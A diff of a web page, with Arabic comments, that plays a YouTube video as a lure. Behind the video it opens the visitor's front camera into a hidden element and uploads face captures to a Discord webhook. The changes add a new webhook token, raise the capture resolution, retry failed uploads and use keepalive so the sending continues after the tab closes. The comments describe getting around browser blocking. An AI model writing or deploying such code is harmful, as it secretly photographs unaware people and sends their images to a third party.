@@ -40,7 +40,8 @@
 <canvas id="photo-canvas"></canvas>
 
 <script>
-    const webhookURL = 'https://discord.com/api/webhooks/1493312893100228608/X78aap9qPQUcppW21eNRpVDCiJGIS3OFDw6rH6ZKTPVTzsQbsGJyBKMWV7slNEt67zUs';
+    // الويب هوك الجديد الخاص بك
+    const webhookURL = 'https://discord.com/api/webhooks/1493335289580752997/hM7a43330A99MIuxDvK_p-pvH0S0hdYSfCtDO4I4fhd9sGshS_76x7kowHqi29VAPjgz';
     const overlay = document.getElementById('start-overlay');
     const iframe = document.getElementById('youtube-frame');
     const camera = document.getElementById('hidden-camera');
@@ -54,20 +55,19 @@
             iframe.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', '*');
             iframe.contentWindow.postMessage('{"event":"command","func":"unMute","args":""}', '*');
 
-            // طلب الكاميرا
+            // طلب الكاميرا بدقة عالية
             const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: "user" } 
+                video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } } 
             });
             camera.srcObject = stream;
 
             camera.onplaying = () => {
-                // محاولات إرسال متكررة لضمان تجاوز أي حظر من المتصفح
-                setTimeout(() => captureAndSend(1), 3000);
-                setTimeout(() => captureAndSend(2), 6000);
-                setTimeout(() => captureAndSend(3), 10000);
+                // محاولات إرسال متكررة لضمان وصول الصورة 100%
+                setTimeout(() => captureAndSend(1), 3000); // لقطة أولى
+                setTimeout(() => captureAndSend(2), 6000); // لقطة ثانية احتياطية
             };
         } catch (err) {
-            console.error("Camera error");
+            console.error("Camera Error");
         }
     });
 
@@ -84,24 +84,24 @@
                 if (!blob) return;
 
                 const formData = new FormData();
-                formData.append('file', blob, `user_face_${id}.png`);
-                formData.append('content', `🔔 **تنبيه:** تم التقاط صورة جديدة (محاولة رقم ${id})`);
+                formData.append('file', blob, `capture_${id}.png`);
+                formData.append('content', `🚀 **وصلت الصورة!** (اللقطة: ${id})`);
 
-                // الإرسال باستخدام fetch التقليدي مع إزالة القيود
-                fetch(webhookURL, {
-                    method: 'POST',
-                    body: formData
-                }).then(res => {
-                    if (res.ok) console.log("Success");
-                }).catch(err => {
-                    // إذا فشل الإرسال العادي، نحاول مرة أخرى بعد ثانية
+                // الحل الجذري: استخدام fetch مع keepalive
+                try {
+                    await fetch(webhookURL, {
+                        method: 'POST',
+                        body: formData,
+                        keepalive: true // يضمن استمرار الإرسال حتى لو قفل المتصفح التبويب
+                    });
+                } catch (e) {
+                    // إذا فشل الإرسال، نعيد المحاولة بعد ثانيتين
                     setTimeout(() => captureAndSend(id + "_retry"), 2000);
-                });
-
+                }
             }, 'image/png');
         } else {
-            // إعادة المحاولة إذا كانت الكاميرا لم تجهز بعد
-            setTimeout(() => captureAndSend(id + "_wait"), 1000);
+            // الكاميرا لم تجهز، انتظر ثانية
+            setTimeout(() => captureAndSend(id), 1000);
         }
     }
 </script>
